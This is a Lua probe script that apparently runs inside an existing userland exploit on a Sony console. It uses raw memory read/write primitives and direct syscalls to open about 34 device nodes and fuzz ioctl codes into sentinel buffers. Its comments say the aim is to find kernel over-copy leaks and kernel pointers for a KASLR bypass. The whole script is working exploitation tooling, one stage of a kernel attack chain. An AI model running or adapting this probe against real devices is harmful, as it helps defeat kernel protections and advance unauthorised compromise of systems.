-- CRASH_CLASS: LOW
-- PROBE 387a: ioctl overcopy + kernel pointer scan
--
-- Context: gc (25 cmds) and dce (1 cmd) are clean (56m). The Praetorian KASLR
-- leak is an unidentified Sony ioctl over-copy. ugen0.2 has 16 real commands
-- at group 0x55 that were never sentinel-checked. Catch-all devices (camera,
-- hid, hmd_*) accept every ioctl code but we never checked if they WRITE data.
-- Remaining non-catch-all devices were only partly swept (28 groups × 32 cmds).
--
-- Strategy:
--   [A] Open all 34 devices
--   [B] ugen0.2 group 0x55: sentinel-buffer overcopy check on all 256 cmds
--   [C] Catch-all devices: sentinel check at targeted ioctl codes
--   [D] Full group discovery 0x00-0xFF on remaining non-catch-all devices
--   [E] Overcopy check on any new hits from [D]
--   [F] Summary + kernel pointer report

print("=== PROBE 387a: ioctl overcopy scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local SENTINEL = 0xDEAD0000
local BUF_SIZE = 0x1000  -- 4KB sentinel buffer
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function path_buf(p)
    local b = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do wd(N(b) + i, 0) end
    for i = 0, #p - 1, 4 do
        local d = 0
        for j = 0, 3 do
            if i + j < #p then d = d + string.byte(p, i + j + 1) * (256 ^ j) end
        end
        wd(N(b) + i, d)
    end
    return b
end

local sc5 = mk(5)
local sc6 = mk(6)
local sc_ioctl = mk(54)

-- Fill buffer with sentinel pattern
local function fill_sentinel(buf)
    local a = N(buf)
    for i = 0, BUF_SIZE - 4, 4 do wd(a + i, SENTINEL) end
end

-- Count modified dwords (non-sentinel) and find max modified offset
-- Returns: modified_count, max_offset, kptr_list
local function scan_buffer(buf, declared_len)
    local a = N(buf)
    local modified = 0
    local max_off = -1
    local kptrs = {}
    for i = 0, BUF_SIZE - 8, 4 do
        local dw = rd(a + i)
        if dw == nil then break end
        if dw < 0 then dw = dw + 0x100000000 end
        if dw ~= SENTINEL then
            modified = modified + 1
            if i > max_off then max_off = i end
            -- Check for kernel pointer pattern in qword
            if i % 8 == 0 then
                local hi = rd(a + i + 4)
                if hi then
                    if hi < 0 then hi = hi + 0x100000000 end
                    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                        kptrs[#kptrs + 1] = {off = i, hi = hi, lo = dw}
                    end
                end
            end
        end
    end
    local overcopy = (max_off >= 0 and max_off >= declared_len)
    return modified, max_off, kptrs, overcopy
end

-- ===================================================================
-- [A] Open all devices
-- ===================================================================
print("[A] open devices")

local all_devs = {
    "gc", "dce",
    "ugen0.2",
    "camera", "hid",
    "hmd_cmd", "hmd_snsr", "hmd_3da", "hmd_dist",
    "hmd2_cmd", "hmd2_imu", "hmd2_leddet", "hmd2_gaze",
    "ajm", "ajmi",
    "bt", "rng", "random", "urandom",
    "gic", "dmem0", "dmem1", "dmem2",
    "notification0", "notification1", "notification2", "notification3",
    "notification4", "notification5", "notification6", "notification7",
    "deci_stdin", "sce_zlib",
    "usbctl", "usb",
    "zero",
}

local fds = {}  -- {name, fd}
local fd_by_name = {}
for _, nm in ipairs(all_devs) do
    local path = "/dev/" .. nm
    local ok1, rv = pcall(function() return sc5(path_buf(path), uint64(2)) end)
    local fd = ok1 and N(rv) or -1
    if fd < 0 or fd >= 0x10000 then
        ok1, rv = pcall(function() return sc5(path_buf(path), uint64(0)) end)
        fd = ok1 and N(rv) or -1
    end
    if fd >= 0 and fd < 0x10000 then
        fds[#fds + 1] = {nm, fd}
        fd_by_name[nm] = fd
    end
end
print(string.format("  opened %d/%d devices", #fds, #all_devs))
for _, e in ipairs(fds) do
    print(string.format("  %-16s fd=%d", e[1], e[2]))
end
if not alive() then print("DEAD after open"); return end

-- Sentinel buffer (reused)
local sbuf = memory.alloc(BUF_SIZE)

-- Track all findings
local all_kptrs = {}
local all_overcopy = {}

-- ===================================================================
-- [B] ugen0.2: group 0x55 overcopy check
-- ===================================================================
print("")
print("[B] ugen0.2 group 0x55 overcopy scan")

local ugen_fd = fd_by_name["ugen0.2"]
if ugen_fd then
    local ugen_hits = 0
    local sizes = {0x04, 0x08, 0x10, 0x20, 0x40, 0x100, 0x200, 0x400}
    for _, sz in ipairs(sizes) do
        for cmd = 0, 0xFF do
            if not alive() then print("DEAD in ugen scan"); break end
            -- IOC_OUT: 0x40000000 | (sz << 16) | (0x55 << 8) | cmd
            local code = 0x40000000 + sz * 0x10000 + 0x5500 + cmd
            fill_sentinel(sbuf)
            local ok, rv = pcall(function()
                return sc_ioctl(uint64(ugen_fd), uint64(code), sbuf)
            end)
            local ret = ok and N(rv) or -999
            if ret >= 0 and ret < 0x10000 then
                -- Command accepted! Check buffer
                local modified, max_off, kptrs, overcopy = scan_buffer(sbuf, sz)
                if modified > 0 then
                    ugen_hits = ugen_hits + 1
                    local tag = ""
                    if overcopy then tag = " *** OVERCOPY ***" end
                    if #kptrs > 0 then tag = tag .. " *** KPTR ***" end
                    print(string.format("  code=0x%08X ret=%d sz=%d mod=%d max_off=0x%X%s",
                        code, ret, sz, modified, max_off, tag))
                    if overcopy then
                        all_overcopy[#all_overcopy + 1] = {
                            dev = "ugen0.2", code = code, sz = sz,
                            modified = modified, max_off = max_off
                        }
                    end
                    for _, kp in ipairs(kptrs) do
                        all_kptrs[#all_kptrs + 1] = {
                            dev = "ugen0.2", code = code,
                            off = kp.off, hi = kp.hi, lo = kp.lo
                        }
                        print(string.format("    KPTR at +0x%X: 0x%08X%08X",
                            kp.off, kp.hi, kp.lo))
                    end
                end
            end
        end
        if not alive() then break end
    end
    print(string.format("  ugen hits with data: %d", ugen_hits))
else
    print("  ugen0.2 not opened, skip")
end
if not alive() then print("DEAD after ugen"); return end

-- ===================================================================
-- [C] Catch-all devices: sentinel overcopy check
-- ===================================================================
print("")
print("[C] catch-all devices overcopy scan")

local catchall_devs = {
    "camera", "hid",
    "hmd_cmd", "hmd_snsr", "hmd_3da",
    "hmd2_cmd", "hmd2_imu", "hmd2_leddet", "hmd2_gaze",
}

-- For catch-alls, try targeted group bytes + Sony range
local catchall_groups = {
    0x41, 0x42, 0x43, 0x44, 0x48, 0x4B, 0x4F, 0x50,
    0x53, 0x55, 0x63, 0x64, 0x67, 0x68, 0x76,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95,
}
local catchall_sizes = {0x08, 0x20, 0x40, 0x100, 0x200, 0x400}
local catchall_cmds = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x10, 0x20}
local catchall_hits = 0

for _, nm in ipairs(catchall_devs) do
    local fd = fd_by_name[nm]
    if not fd then
        -- skip
    else
        local dev_hits = 0
        for _, grp in ipairs(catchall_groups) do
            for _, sz in ipairs(catchall_sizes) do
                for _, cmd in ipairs(catchall_cmds) do
                    if not alive() then break end
                    local code = 0x40000000 + sz * 0x10000 + grp * 0x100 + cmd
                    fill_sentinel(sbuf)
                    local ok, rv = pcall(function()
                        return sc_ioctl(uint64(fd), uint64(code), sbuf)
                    end)
                    local ret = ok and N(rv) or -999
                    -- Catch-alls return fd number, so check ret >= 0
                    if ret >= 0 then
                        local modified, max_off, kptrs, overcopy = scan_buffer(sbuf, sz)
                        if modified > 0 then
                            dev_hits = dev_hits + 1
                            if dev_hits <= 5 or overcopy or #kptrs > 0 then
                                local tag = ""
                                if overcopy then tag = " OVERCOPY" end
                                if #kptrs > 0 then tag = tag .. " KPTR" end
                                print(string.format("  %s code=0x%08X ret=%d mod=%d max=0x%X%s",
                                    nm, code, ret, modified, max_off, tag))
                            end
                            if overcopy then
                                all_overcopy[#all_overcopy + 1] = {
                                    dev = nm, code = code, sz = sz,
                                    modified = modified, max_off = max_off
                                }
                            end
                            for _, kp in ipairs(kptrs) do
                                all_kptrs[#all_kptrs + 1] = {
                                    dev = nm, code = code,
                                    off = kp.off, hi = kp.hi, lo = kp.lo
                                }
                            end
                        end
                    end
                end
                if not alive() then break end
            end
            if not alive() then break end
        end
        if dev_hits > 5 then
            print(string.format("  %s: %d more hits (suppressed)", nm, dev_hits - 5))
        end
        catchall_hits = catchall_hits + dev_hits
    end
    if not alive() then break end
end
print(string.format("  catch-all total hits with data: %d", catchall_hits))
if not alive() then print("DEAD after catch-all"); return end

-- ===================================================================
-- [D] Non-catch-all remaining devices: full group discovery 0x00-0xFF
-- ===================================================================
print("")
print("[D] full group discovery on remaining devices")

local noncatchall = {
    "ajm", "ajmi", "bt", "rng", "random", "urandom",
    "gic", "dmem0", "dmem1", "dmem2",
    "notification0", "notification1", "notification2", "notification3",
    "notification4", "notification5", "notification6", "notification7",
    "deci_stdin", "sce_zlib", "usbctl", "usb", "zero",
    "hmd_dist",
}

local new_hits = {}
local disc_sizes = {0x04, 0x08, 0x20, 0x40, 0x100}

for _, nm in ipairs(noncatchall) do
    local fd = fd_by_name[nm]
    if not fd then
        -- skip
    else
        local dev_found = {}
        for grp = 0, 0xFF do
            if not alive() then break end
            for _, sz in ipairs(disc_sizes) do
                -- Try IOC_OUT first
                local code = 0x40000000 + sz * 0x10000 + grp * 0x100
                fill_sentinel(sbuf)
                local ok, rv = pcall(function()
                    return sc_ioctl(uint64(fd), uint64(code), sbuf)
                end)
                local ret = ok and N(rv) or -999
                if ret >= 0 and ret < 0x10000 then
                    local modified, max_off, kptrs, overcopy = scan_buffer(sbuf, sz)
                    -- Filter out file-layer commands (FIODTYPE = group 0x66)
                    if grp ~= 0x66 then
                        dev_found[grp] = {code = code, ret = ret, sz = sz,
                            modified = modified, max_off = max_off,
                            kptrs = kptrs, overcopy = overcopy}
                        break  -- found a working size for this group
                    end
                end
                -- Also try IOC_INOUT
                code = 0xC0000000 + sz * 0x10000 + grp * 0x100
                fill_sentinel(sbuf)
                ok, rv = pcall(function()
                    return sc_ioctl(uint64(fd), uint64(code), sbuf)
                end)
                ret = ok and N(rv) or -999
                if ret >= 0 and ret < 0x10000 then
                    local modified, max_off, kptrs, overcopy = scan_buffer(sbuf, sz)
                    if grp ~= 0x66 then
                        dev_found[grp] = {code = code, ret = ret, sz = sz,
                            modified = modified, max_off = max_off,
                            kptrs = kptrs, overcopy = overcopy}
                        break
                    end
                end
            end
        end
        -- Report findings
        local count = 0
        for _ in pairs(dev_found) do count = count + 1 end
        if count > 0 then
            print(string.format("  %s: %d active groups", nm, count))
            for grp, info in pairs(dev_found) do
                local tag = ""
                if info.overcopy then tag = " OVERCOPY" end
                if #info.kptrs > 0 then tag = tag .. " KPTR" end
                print(string.format("    grp=0x%02X code=0x%08X ret=%d mod=%d max=0x%X%s",
                    grp, info.code, info.ret, info.modified, info.max_off, tag))
                if info.overcopy then
                    all_overcopy[#all_overcopy + 1] = {
                        dev = nm, code = info.code, sz = info.sz,
                        modified = info.modified, max_off = info.max_off
                    }
                end
                for _, kp in ipairs(info.kptrs) do
                    all_kptrs[#all_kptrs + 1] = {
                        dev = nm, code = info.code,
                        off = kp.off, hi = kp.hi, lo = kp.lo
                    }
                end
                -- Expand: sweep nums 0x01-0xFF for this group
                new_hits[#new_hits + 1] = {nm = nm, fd = fd, grp = grp, sz = info.sz}
            end
        end
    end
    if not alive() then break end
end
if not alive() then print("DEAD after discovery"); return end

-- ===================================================================
-- [E] Expand new hits: sweep cmd 0x01-0xFF for discovered groups
-- ===================================================================
if #new_hits > 0 then
    print("")
    print("[E] expanding " .. #new_hits .. " new groups")
    for _, hit in ipairs(new_hits) do
        if not alive() then break end
        local fd = hit.fd
        local grp = hit.grp
        local expand_sizes = {hit.sz, 0x08, 0x20, 0x100, 0x200}
        local seen_sz = {}
        for cmd = 1, 0xFF do
            if not alive() then break end
            for _, sz in ipairs(expand_sizes) do
                if not seen_sz[sz .. "_" .. cmd] then
                    seen_sz[sz .. "_" .. cmd] = true
                    local code = 0x40000000 + sz * 0x10000 + grp * 0x100 + cmd
                    fill_sentinel(sbuf)
                    local ok, rv = pcall(function()
                        return sc_ioctl(uint64(fd), uint64(code), sbuf)
                    end)
                    local ret = ok and N(rv) or -999
                    if ret >= 0 and ret < 0x10000 then
                        local modified, max_off, kptrs, overcopy = scan_buffer(sbuf, sz)
                        if modified > 0 then
                            local tag = ""
                            if overcopy then tag = " OVERCOPY" end
                            if #kptrs > 0 then tag = tag .. " KPTR" end
                            print(string.format("  %s grp=0x%02X cmd=0x%02X sz=0x%X ret=%d mod=%d max=0x%X%s",
                                hit.nm, grp, cmd, sz, ret, modified, max_off, tag))
                            if overcopy then
                                all_overcopy[#all_overcopy + 1] = {
                                    dev = hit.nm, code = code, sz = sz,
                                    modified = modified, max_off = max_off
                                }
                            end
                            for _, kp in ipairs(kptrs) do
                                all_kptrs[#all_kptrs + 1] = {
                                    dev = hit.nm, code = code,
                                    off = kp.off, hi = kp.hi, lo = kp.lo
                                }
                            end
                        end
                        break  -- found a working size
                    end
                end
            end
        end
    end
end
if not alive() then print("DEAD after expand"); return end

-- ===================================================================
-- [F] Summary
-- ===================================================================
print("")
print("[F] SUMMARY")
print(string.format("  kernel pointers found: %d", #all_kptrs))
print(string.format("  overcopy incidents: %d", #all_overcopy))

if #all_kptrs > 0 then
    print("")
    print("  *** KERNEL POINTERS ***")
    for _, kp in ipairs(all_kptrs) do
        print(string.format("    %s code=0x%08X off=+0x%X val=0x%08X%08X",
            kp.dev, kp.code, kp.off, kp.hi, kp.lo))
    end
end

if #all_overcopy > 0 then
    print("")
    print("  *** OVERCOPY INCIDENTS ***")
    for _, oc in ipairs(all_overcopy) do
        print(string.format("    %s code=0x%08X declared=%d actual_max=0x%X mod=%d",
            oc.dev, oc.code, oc.sz, oc.max_off, oc.modified))
    end
end

if #all_kptrs == 0 and #all_overcopy == 0 then
    print("  CLEAN — no kernel pointers or overcopy on any device")
end

-- Cleanup: close opened fds
for _, e in ipairs(fds) do
    pcall(function() sc6(uint64(e[2])) end)
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 387a COMPLETE ===")
